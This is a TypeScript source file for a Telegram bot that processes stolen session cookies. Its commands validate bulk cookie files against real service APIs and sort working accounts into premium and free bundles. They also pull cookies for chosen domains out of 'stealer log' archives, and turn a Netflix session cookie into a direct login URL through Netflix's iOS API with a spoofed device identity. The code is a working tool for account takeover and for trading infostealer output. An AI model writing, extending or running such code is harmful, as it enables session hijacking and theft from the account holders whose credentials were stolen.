import { Telegraf, Markup } from "telegraf";
import AdmZip from "adm-zip";
import axios from "axios";
import * as fs from "fs";
import * as os from "os";
import * as path from "path";
import { randomBytes } from "crypto";
import { spawnSync } from "child_process";
import { logger } from "./lib/logger";
import { bypassLink, isValidUrl, VpnBlockedError } from "./bypass";
import {
  checkCookie,
  getSupportedServices,
  getServiceList,
  type CookieCheckResult,
} from "./cookieChecker";
import { extractLogsFromDirectoryAsync } from "./logExtractor";
import { storeNfToken } from "./lib/nftokenStore";

// ─── Telegram bot setup ───────────────────────────────────────────────────────
const token = process.env["TELEGRAM_BOT_TOKEN"];
if (!token) throw new Error("TELEGRAM_BOT_TOKEN is not set.");
const bot = new Telegraf(token);

// ─── Per-chat state ───────────────────────────────────────────────────────────
type Mode = "check" | "log" | "nftoken" | "bypass";
const userMode = new Map<number, Mode>();
const userCheckService = new Map<number, string>();   // domain chosen for /check
const userLogDomains = new Map<number, string[]>();   // domains for /log extraction
const userCheckPage = new Map<number, number>();      // keyboard page for /check

// ─── Service keyboard helpers ─────────────────────────────────────────────────
const PAGE_SIZE = 8;

function buildServiceKeyboard(page: number) {
  const services = getServiceList();
  const totalPages = Math.ceil(services.length / PAGE_SIZE);
  const slice = services.slice(page * PAGE_SIZE, (page + 1) * PAGE_SIZE);

  const rows = [];
  for (let i = 0; i < slice.length; i += 2) {
    const row = [slice[i]!, ...(slice[i + 1] ? [slice[i + 1]!] : [])].map((s) =>
      Markup.button.callback(`${s.emoji} ${s.name}`, `csvc:${s.domain}`),
    );
    rows.push(row);
  }

  const nav = [];
  if (page > 0) nav.push(Markup.button.callback("◀ Prev", `cpage:${page - 1}`));
  nav.push(Markup.button.callback(`${page + 1}/${totalPages}`, "cnoop"));
  if (page < totalPages - 1) nav.push(Markup.button.callback("Next ▶", `cpage:${page + 1}`));
  rows.push(nav);
  rows.push([Markup.button.callback("🔍 Auto-detect", "csvc:auto")]);

  return Markup.inlineKeyboard(rows);
}

// ─── Archive extraction ───────────────────────────────────────────────────────
function extractArchive(srcPath: string, ext: string, password?: string): string {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "ccbot-"));
  const outDir = path.join(tmpDir, "out");
  fs.mkdirSync(outDir, { recursive: true });

  const isRar = ext === ".rar";
  if (isRar) {
    const args = ["x", ...(password ? [`-p${password}`] : ["-p-"]), `-o${outDir}`, srcPath, "-y", "-bso0", "-bsp0"];
    const r = spawnSync("7z", args, { stdio: "ignore", timeout: 300_000 });
    if (r.status !== 0) {
      // fallback to unrar
      const r2 = spawnSync("unrar", ["x", password ? `-p${password}` : "-p-", "-o+", srcPath, `${outDir}/`], { stdio: "ignore", timeout: 300_000 });
      if (r2.status !== 0 && r2.status !== 1) throw new Error(`RAR extraction failed (exit ${r2.status})`);
    }
  } else {
    // ZIP / 7z — try system 7z first, fall back to AdmZip
    const args = ["x", ...(password ? [`-p${password}`] : ["-p-"]), `-o${outDir}`, srcPath, "-y", "-bso0", "-bsp0"];
    const r = spawnSync("7z", args, { stdio: "ignore", timeout: 300_000 });
    if (r.status !== 0) {
      // AdmZip fallback
      try {
        const zip = new AdmZip(srcPath);
        zip.extractAllTo(outDir, true);
      } catch (e) {
        throw new Error(`ZIP extraction failed: ${(e as Error).message}`);
      }
    }
  }
  return outDir;
}

// ─── Telegram file download ───────────────────────────────────────────────────
async function downloadTelegramFile(fileId: string): Promise<Buffer> {
  const fileInfo = await bot.telegram.getFile(fileId);
  const fileUrl = `https://api.telegram.org/file/bot${token}/${fileInfo.file_path}`;
  const res = await axios.get<ArrayBuffer>(fileUrl, { responseType: "arraybuffer", timeout: 120_000 });
  return Buffer.from(res.data);
}

// ─── Netflix iOS API ──────────────────────────────────────────────────────────
const NF_IOS_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48";
const NF_IOS_QUERY = new URLSearchParams({
  appVersion: "15.48.1",
  config: '{"gamesInTrailersEnabled":"false"}',
  device_type: "NFAPPL-02-",
  esn: "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
  idiom: "phone",
  iosVersion: "15.8.5",
  languages: "en-US",
  locale: "en-US",
  maxDeviceWidth: "375",
  model: "saget",
  odpAware: "true",
  path: '["account","token","default"]',
  pathFormat: "graph",
  responseFormat: "json",
}).toString();
const NF_IOS_HEADERS: Record<string, string> = {
  "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
  "x-netflix.request.attempt": "1",
  "x-netflix.context.app-version": "15.48.1",
  "x-netflix.client.type": "argo",
  "x-netflix.client.ftl.esn":
    "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
  "x-netflix.context.locales": "en-US",
  "x-netflix.argo.translated": "true",
  "accept-language": "en-US;q=1",
};

function parseNetflixId(content: string): string {
  // Netscape TSV format
  for (const line of content.split("\n")) {
    const t = line.trim();
    if (!t || t.startsWith("#")) continue;
    const parts = t.split("\t");
    if (parts.length >= 7 && parts[5]?.trim().toLowerCase() === "netflixid") {
      return parts.slice(6).join(" ").trim();
    }
  }
  // Raw cookie string
  const raw = content.match(/(?<![A-Za-z])NetflixId=([^;\s,\n\r]+)/i);
  if (raw?.[1]) return raw[1].trim();
  // JSON
  try {
    const parsed: unknown = JSON.parse(content);
    const arr: unknown[] = Array.isArray(parsed)
      ? parsed
      : (parsed as Record<string, unknown>)?.["cookies"] as unknown[] ?? [];
    for (const c of arr) {
      const obj = c as Record<string, unknown>;
      if (String(obj["name"] ?? "").toLowerCase() === "netflixid") return String(obj["value"] ?? "");
    }
  } catch {/* */}
  return "";
}

async function fetchNfToken(cookieContent: string): Promise<{ url: string; expires: number | null }> {
  const netflixId = parseNetflixId(cookieContent);
  if (!netflixId) throw new Error("NetflixId cookie not found. Send a valid Netflix cookie file.");

  const res = await fetch(`${NF_IOS_API_URL}?${NF_IOS_QUERY}`, {
    method: "GET",
    headers: { ...NF_IOS_HEADERS, Cookie: `NetflixId=${netflixId}` },
  });

  if (!res.ok) {
    if (res.status === 401 || res.status === 403) throw new Error("Cookie is invalid or expired — Netflix rejected it.");
    const body = await res.text().catch(() => "");
    throw new Error(`Netflix API error ${res.status}: ${body.slice(0, 200)}`);
  }

  const data = (await res.json()) as Record<string, unknown>;
  const tokenData = (
    ((data["value"] as Record<string, unknown>)?.["account"] as Record<string, unknown>)
      ?.["token"] as Record<string, unknown>
  )?.["default"] as Record<string, unknown> | undefined;

  const nfTokenStr = tokenData?.["token"] as string | undefined;
  let expires = (tokenData?.["expires"] as number | null) ?? null;
  if (!nfTokenStr) throw new Error("Netflix API did not return a token. Cookie may be expired.");
  if (typeof expires === "number" && String(expires).length === 13) expires = Math.floor(expires / 1000);

  return { url: `https://www.netflix.com/browse?nftoken=${encodeURIComponent(nfTokenStr)}`, expires };
}

// ─── /nftoken content handler ─────────────────────────────────────────────────
async function handleNftokenContent(chatId: number, cookieContent: string): Promise<void> {
  const { url, expires } = await fetchNfToken(cookieContent);

  // Optionally wrap behind our server URL for a clean expiring link
  const serverBase = process.env["REPLIT_DEV_DOMAIN"]
    ? `https://${process.env["REPLIT_DEV_DOMAIN"]}`
    : null;
  let displayUrl = url;
  if (serverBase) {
    const tok = randomBytes(16).toString("hex");
    storeNfToken(tok, url, cookieContent);
    displayUrl = `${serverBase}/nftoken/${tok}`;
  }

  const expiryStr = expires ? new Date(expires * 1000).toUTCString() : "Unknown";
  const ttlMins = expires ? Math.round((expires * 1000 - Date.now()) / 60_000) : null;
  const ttlLine = ttlMins ? `⏱ Expires in ~${ttlMins} min (${expiryStr})` : "";

  await bot.telegram.sendMessage(
    chatId,
    `🎬 <b>Netflix Login URL</b>\n\n` +
      `<b>Login URL:</b>\n<code>${displayUrl}</code>\n\n` +
      `${ttlLine}\n\n` +
      `📱 <b>Tip:</b> Copy the URL and open in Chrome/Safari — do NOT tap from Telegram directly (may open the app instead of logging in).`,
    {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: [[{ text: "🎬 Open in Netflix", url }]] },
    },
  );
}

// ─── /check file handler ──────────────────────────────────────────────────────
async function handleCheckFile(
  chatId: number,
  fileBuffer: Buffer,
  filename: string,
  serviceDomain: string | undefined,
  statusMsgId: number,
): Promise<void> {
  const edit = (text: string) =>
    bot.telegram.editMessageText(chatId, statusMsgId, undefined, text, { parse_mode: "HTML" }).catch(() => {});

  // Wrap single cookie file in a ZIP
  let zipBuffer: Buffer;
  const low = filename.toLowerCase();
  if (low.endsWith(".zip")) {
    zipBuffer = fileBuffer;
  } else {
    const wrap = new AdmZip();
    wrap.addFile(filename, fileBuffer);
    zipBuffer = wrap.toBuffer();
  }

  const zip = new AdmZip(zipBuffer);
  const entries = zip.getEntries().filter(
    (e) => !e.isDirectory && /\.(txt|json|cookies?|log)$/i.test(e.name),
  );

  if (entries.length === 0) {
    await edit("❌ No supported cookie files found (.txt, .json, .cookies, .log)");
    return;
  }

  await edit(`⏳ Found <b>${entries.length}</b> cookie file(s). Checking${serviceDomain ? ` as <b>${serviceDomain}</b>` : " (auto-detect)"}...`);

  const results: CookieCheckResult[] = [];
  const validEntries: Array<{ name: string; content: string; result: CookieCheckResult }> = [];
  let lastEdit = Date.now();

  for (let i = 0; i < entries.length; i++) {
    const entry = entries[i]!;
    const content = entry.getData().toString("utf-8");
    const result = await checkCookie(entry.name, content, serviceDomain === "auto" ? undefined : serviceDomain);
    results.push(result);
    if (result.valid) validEntries.push({ name: entry.name, content, result });

    const now = Date.now();
    if (i > 0 && (i % 10 === 0 || now - lastEdit > 4000)) {
      lastEdit = now;
      const validSoFar = results.filter((r) => r.valid).length;
      await edit(`⏳ Checking... <b>${i + 1}/${entries.length}</b>\n✅ Valid so far: ${validSoFar}`);
    }
  }

  // Build summary
  const totalValid = validEntries.length;
  const totalInvalid = results.length - totalValid;
  const serviceGroups = new Map<string, { premium: Array<{ name: string; content: string }>; free: Array<{ name: string; content: string }> }>();

  for (const { name, content, result } of validEntries) {
    const key = result.planLabel ? `${result.service} [${result.planLabel}]` : result.service;
    if (!serviceGroups.has(key)) serviceGroups.set(key, { premium: [], free: [] });
    const group = serviceGroups.get(key)!;
    (result.plan === "premium" ? group.premium : group.free).push({ name, content });
  }

  let summaryLines = [`<b>✅ Valid: ${totalValid} | ❌ Invalid: ${totalInvalid} | 📁 Total: ${results.length}</b>\n`];

  for (const [svcKey, group] of serviceGroups) {
    if (group.premium.length) summaryLines.push(`👑 ${svcKey}: ${group.premium.length}`);
    if (group.free.length) summaryLines.push(`🆓 ${svcKey} Free: ${group.free.length}`);
  }

  // Show invalid errors summary (top 5)
  const errors = results.filter((r) => !r.valid).slice(0, 5);
  if (errors.length) {
    summaryLines.push("\n<b>Sample errors:</b>");
    for (const e of errors) summaryLines.push(`• ${e.service}: ${e.error ?? "Unknown"}`);
    if (totalInvalid > 5) summaryLines.push(`…and ${totalInvalid - 5} more`);
  }

  await edit(summaryLines.join("\n"));

  // Send valid cookie ZIPs grouped by service+plan
  let totalZips = 0;
  for (const [svcKey, group] of serviceGroups) {
    const slug = svcKey.toLowerCase().replace(/[^a-z0-9]/g, "_");
    for (const [tier, items] of [["premium", group.premium] as const, ["free", group.free] as const]) {
      if (items.length === 0) continue;
      const outZip = new AdmZip();
      for (const item of items) outZip.addFile(item.name, Buffer.from(item.content, "utf-8"));
      try {
        await bot.telegram.sendDocument(
          chatId,
          { source: outZip.toBuffer(), filename: `${slug}_${tier}.zip` },
          { caption: `${tier === "premium" ? "👑" : "🆓"} ${svcKey} — ${items.length} cookie(s)` },
        );
        totalZips++;
      } catch (e) {
        logger.error({ err: (e as Error).message, svcKey }, "Failed to send result ZIP");
      }
    }
  }

  if (totalValid === 0) {
    await bot.telegram.sendMessage(chatId, "No valid cookies found — nothing to send.");
  } else if (totalZips === 0) {
    await bot.telegram.sendMessage(chatId, `✅ ${totalValid} valid cookie(s) found but ZIP sending failed.`);
  }
}

// ─── /log file handler ────────────────────────────────────────────────────────
async function handleLogFile(
  chatId: number,
  fileBuffer: Buffer,
  filename: string,
  domains: string[],
  statusMsgId: number,
): Promise<void> {
  const edit = (text: string) =>
    bot.telegram.editMessageText(chatId, statusMsgId, undefined, text, { parse_mode: "HTML" }).catch(() => {});

  await edit(`⏳ Extracting archive...`);

  // Write buffer to temp file
  const tmpFile = path.join(os.tmpdir(), `cclog_${Date.now()}_${filename}`);
  fs.writeFileSync(tmpFile, fileBuffer);
  let extractDir: string | null = null;

  try {
    const ext = path.extname(filename).toLowerCase();
    extractDir = extractArchive(tmpFile, ext);

    await edit(`⏳ Scanning files for: <b>${domains.join(", ")}</b>...`);

    let lastEdit = Date.now();
    const report = await extractLogsFromDirectoryAsync(extractDir, domains, (scanned, total) => {
      if (Date.now() - lastEdit > 4000) {
        lastEdit = Date.now();
        edit(`⏳ Scanned <b>${scanned}/${total}</b> files...`).catch(() => {});
      }
    });

    if (report.services.length === 0) {
      await edit(`❌ No cookies found for: <b>${domains.join(", ")}</b>\n\n<i>Scanned ${report.totalFilesScanned} files, found ${report.totalCookiesFound} total cookies.</i>`);
      return;
    }

    let summary = `✅ <b>Extraction complete!</b>\n\n`;
    summary += `📁 Files scanned: <b>${report.totalFilesScanned}</b>\n`;
    summary += `🍪 Cookies found: <b>${report.totalCookiesFound}</b>\n\n`;
    summary += `<b>By domain:</b>\n`;
    for (const svc of report.services) {
      summary += `• ${svc.domain}: ${svc.files.length} session(s), ${svc.totalDomainCookies} cookie(s)\n`;
    }
    summary += `\n💡 Use /check to validate these cookies.`;

    await edit(summary);

    for (const svc of report.services) {
      const outZip = new AdmZip();
      for (let i = 0; i < svc.files.length; i++) {
        outZip.addFile(`${svc.domain}_${i + 1}.txt`, Buffer.from(svc.files[i]!.domainContent, "utf-8"));
      }
      try {
        await bot.telegram.sendDocument(
          chatId,
          { source: outZip.toBuffer(), filename: `${svc.domain}.zip` },
          { caption: `📦 ${svc.domain} — ${svc.files.length} session(s), ${svc.totalDomainCookies} cookie(s)` },
        );
      } catch (e) {
        logger.error({ err: (e as Error).message, domain: svc.domain }, "Failed to send log ZIP");
      }
    }
  } finally {
    try { fs.unlinkSync(tmpFile); } catch {/* */}
    if (extractDir) {
      try { fs.rmSync(path.dirname(extractDir), { recursive: true, force: true }); } catch {/* */}
    }
  }
}

// ─── Commands ─────────────────────────────────────────────────────────────────
bot.start(async (ctx) => {
  await ctx.reply(
    `👋 <b>Welcome!</b> This bot has two main features:\n\n` +
      `<b>🔗 Link Bypasser</b> — paste any shortened URL and I'll resolve it.\n\n` +
      `<b>🍪 Cookie Checker</b>\n` +
      `/check — Validate cookies against real service APIs\n` +
      `/log — Extract cookies from stealer log archives by domain\n` +
      `/nftoken — Generate a Netflix login URL from your Netflix cookies\n\n` +
      `/help — Full help`,
    { parse_mode: "HTML" },
  );
});

bot.help(async (ctx) => {
  const services = getSupportedServices();
  await ctx.reply(
    `<b>Link Bypasser Bot — Help</b>\n\n` +
      `<b>🔗 Bypass a link:</b> Just paste any URL.\n\n` +
      `<b>🍪 Cookie features:</b>\n` +
      `/check — Select a service, then send a .txt/.json cookie file or ZIP\n` +
      `/log — Send domain names (e.g. <code>netflix.com,spotify.com</code>), then send a ZIP archive\n` +
      `/nftoken — Toggle Netflix token mode, then send a Netflix cookie file or paste cookie text\n\n` +
      `<b>Supported services:</b>\n${services}`,
    { parse_mode: "HTML" },
  );
});

bot.command("check", async (ctx) => {
  const chatId = ctx.chat.id;
  userMode.set(chatId, "check");
  userCheckService.delete(chatId);
  userCheckPage.set(chatId, 0);
  await ctx.reply(
    "🍪 <b>Check Mode</b>\n\nSelect a service to check cookies against:",
    { parse_mode: "HTML", ...buildServiceKeyboard(0) },
  );
});

bot.command("log", async (ctx) => {
  const chatId = ctx.chat.id;
  userMode.set(chatId, "log");
  userLogDomains.delete(chatId);
  await ctx.reply(
    "📋 <b>Log Extract Mode</b>\n\n" +
      "Send the domains you want to extract (comma-separated):\n\n" +
      "<code>netflix.com, spotify.com, chatgpt.com</code>",
    { parse_mode: "HTML" },
  );
});

bot.command("nftoken", async (ctx) => {
  const chatId = ctx.chat.id;
  if (userMode.get(chatId) === "nftoken") {
    userMode.delete(chatId);
    await ctx.reply("ℹ️ /nftoken mode cancelled.");
  } else {
    userMode.set(chatId, "nftoken");
    await ctx.reply(
      "🎬 <b>Netflix Token URL Mode</b>\n\n" +
        "Send your Netflix cookies to generate a login URL from the <code>NetflixId</code> cookie.\n\n" +
        "📎 Attach a <code>.txt</code> cookie file <b>OR</b> paste the Netscape cookie content as text.\n\n" +
        "📱 <b>Tip:</b> Copy the URL and open in Chrome/Safari — don't tap it from Telegram directly.\n\n" +
        "Send /nftoken again to cancel.",
      { parse_mode: "HTML" },
    );
  }
});

// ─── Inline keyboard callbacks ────────────────────────────────────────────────
bot.action(/^cpage:(\d+)$/, async (ctx) => {
  const page = parseInt(ctx.match[1]!, 10);
  const chatId = ctx.chat!.id;
  userCheckPage.set(chatId, page);
  await ctx.editMessageReplyMarkup(buildServiceKeyboard(page).reply_markup);
  await ctx.answerCbQuery();
});

bot.action("cnoop", async (ctx) => {
  await ctx.answerCbQuery();
});

bot.action(/^csvc:(.+)$/, async (ctx) => {
  const domain = ctx.match[1]!;
  const chatId = ctx.chat!.id;
  userCheckService.set(chatId, domain);
  userMode.set(chatId, "check");
  const label = domain === "auto" ? "Auto-detect" : domain;
  await ctx.editMessageText(
    `✅ <b>Service selected:</b> <code>${label}</code>\n\nNow send a <code>.txt</code>, <code>.json</code> cookie file or a ZIP archive.`,
    { parse_mode: "HTML" },
  );
  await ctx.answerCbQuery(`Selected: ${label}`);
});

// ─── Document handler ─────────────────────────────────────────────────────────
bot.on("document", async (ctx) => {
  const chatId = ctx.chat.id;
  const doc = ctx.message.document;
  const filename = doc.file_name ?? "file";
  const mode = userMode.get(chatId);

  // ── /nftoken mode: only .txt cookie files ──
  if (mode === "nftoken" && filename.toLowerCase().endsWith(".txt")) {
    userMode.delete(chatId);
    const loadingMsg = await ctx.reply("🎬 Generating Netflix login URL...");
    try {
      const buf = await downloadTelegramFile(doc.file_id);
      await handleNftokenContent(chatId, buf.toString("utf-8"));
    } catch (err) {
      await ctx.reply(`❌ ${(err as Error).message}`);
    } finally {
      await bot.telegram.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
    }
    return;
  }

  // ── /check mode ──
  if (mode === "check") {
    const serviceDomain = userCheckService.get(chatId) ?? "auto";
    const low = filename.toLowerCase();
    if (!/\.(zip|txt|json|cookies?|log)$/i.test(low)) {
      await ctx.reply("⚠️ Please send a <b>.zip</b> or a cookie file (<b>.txt</b>, <b>.json</b>, <b>.cookies</b>).", { parse_mode: "HTML" });
      return;
    }
    const statusMsg = await ctx.reply(`⏳ Received <b>${filename}</b>. Checking...`, { parse_mode: "HTML" });
    try {
      const buf = await downloadTelegramFile(doc.file_id);
      await handleCheckFile(chatId, buf, filename, serviceDomain, statusMsg.message_id);
    } catch (err) {
      logger.error({ err }, "handleCheckFile error");
      await bot.telegram.editMessageText(chatId, statusMsg.message_id, undefined, `❌ Error: ${(err as Error).message}`).catch(() => {});
    }
    return;
  }

  // ── /log mode ──
  if (mode === "log") {
    const domains = userLogDomains.get(chatId);
    if (!domains) {
      await ctx.reply("⚠️ First send the domains you want to extract (e.g. <code>netflix.com, spotify.com</code>), then send the archive.", { parse_mode: "HTML" });
      return;
    }
    const low = filename.toLowerCase();
    if (!/\.(zip|rar|7z)$/i.test(low)) {
      await ctx.reply("⚠️ Please send a <b>.zip</b>, <b>.rar</b>, or <b>.7z</b> archive.", { parse_mode: "HTML" });
      return;
    }
    userLogDomains.delete(chatId); // consume domains — user must re-enter for next run
    const statusMsg = await ctx.reply(`⏳ Received <b>${filename}</b>. Extracting...`, { parse_mode: "HTML" });
    try {
      const buf = await downloadTelegramFile(doc.file_id);
      await handleLogFile(chatId, buf, filename, domains, statusMsg.message_id);
    } catch (err) {
      logger.error({ err }, "handleLogFile error");
      await bot.telegram.editMessageText(chatId, statusMsg.message_id, undefined, `❌ Error: ${(err as Error).message}`).catch(() => {});
    }
    return;
  }

  // ── Default: prompt mode selection ──
  await ctx.reply(
    "❓ Not sure what to do with this file. Choose a mode first:\n\n" +
      "/check — validate cookie files\n" +
      "/log — extract cookies from stealer log ZIPs",
  );
});

// ─── Text handler ─────────────────────────────────────────────────────────────
bot.on("text", async (ctx) => {
  const chatId = ctx.chat.id;
  const text = ctx.message.text.trim();
  if (text.startsWith("/")) return;

  const mode = userMode.get(chatId);

  // ── /nftoken mode: pasted cookie content ──
  if (mode === "nftoken") {
    userMode.delete(chatId);
    const loadingMsg = await ctx.reply("🎬 Generating Netflix login URL...");
    try {
      await handleNftokenContent(chatId, text);
    } catch (err) {
      await ctx.reply(`❌ ${(err as Error).message}`);
    } finally {
      await bot.telegram.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
    }
    return;
  }

  // ── /log mode: domain list input ──
  if (mode === "log") {
    const domains = text
      .split(/[\s,;]+/)
      .map((d) => d.trim().toLowerCase().replace(/^https?:\/\//, ""))
      .filter(Boolean);
    if (domains.length === 0) {
      await ctx.reply("⚠️ No valid domains found. Example: <code>netflix.com, spotify.com</code>", { parse_mode: "HTML" });
      return;
    }
    userLogDomains.set(chatId, domains);
    await ctx.reply(
      `✅ Domains set: <b>${domains.join(", ")}</b>\n\nNow send the ZIP/RAR/7z archive.`,
      { parse_mode: "HTML" },
    );
    return;
  }

  // ── Default: URL bypass ──
  const urlMatch = text.match(/https?:\/\/[^\s]+/);
  const rawInput = urlMatch ? urlMatch[0] : text;

  if (!isValidUrl(rawInput)) {
    await ctx.reply(
      `❓ Unknown input.\n\nPaste a URL to bypass it, or use:\n/check — validate cookies\n/log — extract from logs\n/nftoken — Netflix login URL`,
    );
    return;
  }

  const processingMsg = await ctx.reply("⏳ Resolving link...");
  const edit = (html: string) =>
    bot.telegram.editMessageText(chatId, processingMsg.message_id, undefined, html, { parse_mode: "HTML" });

  try {
    const result = await bypassLink(rawInput);
    const timeSec = (result.timeTakenMs / 1000).toFixed(1);
    if (result.finalUrl === result.originalUrl) {
      await edit(
        `<b>Original Link:</b>\n✅ ${result.originalUrl}\n\n<b>Result:</b> No redirect found — this is the final URL already.\n\n<i>Time: ${timeSec}s</i>`,
      );
    } else {
      await edit(
        `<b>Original Link:</b>\n✅ ${result.originalUrl}\n\n<b>Bypassed Link:</b>\n✅ ${result.finalUrl}\n\n<i>Time: ${timeSec}s</i>`,
      );
    }
  } catch (err) {
    if (err instanceof VpnBlockedError) {
      await edit(
        `⚠️ <b>VPN/Proxy Block Detected</b>\n\n<b>Link:</b> ${rawInput}\n\nThis site blocks server IPs. Open it directly in your browser.`,
      );
    } else {
      logger.error({ err }, "Bypass error");
      await edit(`❌ <b>Failed to resolve link</b>\n\nThe URL may be unreachable or expired.\n<i>${rawInput}</i>`);
    }
  }
});

// ─── Error handler ────────────────────────────────────────────────────────────
bot.catch((err, ctx) => {
  logger.error({ err, update: ctx.update }, "Unhandled bot error");
});

// ─── Webhook setup ────────────────────────────────────────────────────────────
/**
 * Call AFTER the Express server is listening.
 * Registers the webhook URL with Telegram so updates are pushed to our server.
 * Falls back to long-polling if REPLIT_DEV_DOMAIN is not set (local dev without tunnel).
 */
export async function setupBot(): Promise<void> {
  const domain = process.env["REPLIT_DEV_DOMAIN"];

  if (domain) {
    const webhookUrl = `https://${domain}/api/telegram`;
    try {
      await bot.telegram.setWebhook(webhookUrl);
      logger.info({ webhookUrl }, "Telegram webhook registered");
    } catch (err) {
      logger.error({ err }, "Failed to set webhook — falling back to polling");
      startPolling();
    }
  } else {
    logger.info("REPLIT_DEV_DOMAIN not set — using long-polling");
    startPolling();
  }
}

function startPolling(): void {
  // Best-effort polling — errors are retried automatically by Telegraf
  const launch = () =>
    bot.launch().catch((err) => {
      logger.error({ err }, "Bot polling error — retrying in 5s");
      setTimeout(launch, 5000);
    });
  launch();
  process.once("SIGINT", () => bot.stop("SIGINT"));
  process.once("SIGTERM", () => bot.stop("SIGTERM"));
}

/** Express middleware that receives Telegram webhook updates. */
export function getBotMiddleware() {
  return bot.webhookCallback("/api/telegram");
}

export default bot;
